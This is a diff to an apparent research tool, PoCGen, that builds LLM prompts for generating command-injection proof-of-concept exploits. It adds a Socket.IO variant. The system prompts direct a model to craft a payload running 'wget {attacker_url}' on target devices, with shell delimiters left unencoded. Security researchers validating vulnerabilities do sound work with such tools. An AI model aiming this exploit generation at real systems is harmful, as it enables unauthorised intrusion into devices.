@@ -6,7 +6,7 @@ from PoCGen.llm.client import ChatMessage
 from PoCGen.config.config import SETTINGS
 
 
-def _build_system_prompt(attacker_url: str) -> str:
+def _build_http_system_prompt(attacker_url: str) -> str:
     return (
         "You are a security researcher generating ONE raw HTTP request PoC for a command injection vulnerability.\n"
         "Given several source files and a short vulnerability description, output EXACTLY ONE raw HTTP request that could exploit the issue.\n"
@@ -52,16 +52,14 @@ def _build_system_prompt(attacker_url: str) -> str:
     )
 
 
-def build_prompt_command_injection_http(
+def _build_user_context(
     *,
     description: str,
     code_files: List[str],
     target: str | None,
-    attacker_url: Optional[str] = None,
-    target_profile: str | None = None,
-    validation_feedback: str | None = None,
-) -> List[ChatMessage]:
-    atk = attacker_url or SETTINGS.attacker_url
+    target_profile: str | None,
+    validation_feedback: str | None,
+) -> str:
     user_parts: List[str] = []
     user_parts.append("Vulnerability Description:\n" + description.strip())
     if target:
@@ -74,13 +72,72 @@ def build_prompt_command_injection_http(
         )
     for idx, content in enumerate(code_files, start=1):
         user_parts.append(f"--- Code File #{idx} ---\n{content}")
+    return "\n\n".join(user_parts)
 
-    user = "\n\n".join(user_parts)
-    # LLM input assembly: system prompt + user context/messages
+
+def build_prompt_command_injection_http(
+    *,
+    description: str,
+    code_files: List[str],
+    target: str | None,
+    attacker_url: Optional[str] = None,
+    target_profile: str | None = None,
+    validation_feedback: str | None = None,
+) -> List[ChatMessage]:
+    atk = attacker_url or SETTINGS.attacker_url
+    user = _build_user_context(
+        description=description,
+        code_files=code_files,
+        target=target,
+        target_profile=target_profile,
+        validation_feedback=validation_feedback,
+    )
     return [
-        ChatMessage(role="system", content=_build_system_prompt(atk)),
+        ChatMessage(role="system", content=_build_http_system_prompt(atk)),
         ChatMessage(role="user", content=user),
     ]
 
 
-__all__ = ["build_prompt_command_injection_http"]
+def _build_socket_system_prompt(attacker_url: str) -> str:
+    return (
+        "You are a security researcher crafting EXACTLY ONE Socket.IO exploit payload for a command injection vulnerability.\n"
+        "You must output a SINGLE JSON object (no markdown, no comments) that conforms to the following schema: \n"
+        '{"url": str, "namespace": str|null, "event": str, "headers": {str:str}, "cookies": str|null, "wait_for_response": bool, "max_response_frames": int, "payload": object|string}.\n'
+        "Purpose: leverage the vulnerable event's payload to run 'wget {attacker_url}' on the target device. Mirrors from supplied code/description.\n"
+        "Instructions:\n"
+        "- Infer the Socket.IO endpoint, namespace, and event name directly from the provided code blueprint.\n"
+        "- Populate headers/cookies using any provided hints (e.g., cookies from target sampling).\n"
+        "- The payload MUST mirror the server's expected JSON/formats (arrays, dicts, plain strings). Include ONLY minimal fields plus the injection expression that executes wget {attacker_url}.\n"
+        "- Use true/false for wait_for_response and set max_response_frames to a small positive integer (default 1).\n"
+        "- Do NOT include explanations or extra keys outside the schema. Output must be valid JSON and UTF-8 clean.\n"
+        "- Command payload must keep delimiters such as ';', '&&', '$(...)' unencoded, and should not URL-encode the attacker URL.\n"
+    )
+
+
+def build_prompt_command_injection_socket(
+    *,
+    description: str,
+    code_files: List[str],
+    target: str | None,
+    attacker_url: Optional[str] = None,
+    target_profile: str | None = None,
+    validation_feedback: str | None = None,
+) -> List[ChatMessage]:
+    atk = attacker_url or SETTINGS.attacker_url
+    user = _build_user_context(
+        description=description,
+        code_files=code_files,
+        target=target,
+        target_profile=target_profile,
+        validation_feedback=validation_feedback,
+    )
+    return [
+        ChatMessage(role="system", content=_build_socket_system_prompt(atk)),
+        ChatMessage(role="user", content=user),
+    ]
+
+
+__all__ = [
+    "build_prompt_command_injection_http",
+    "build_prompt_command_injection_socket",
+]
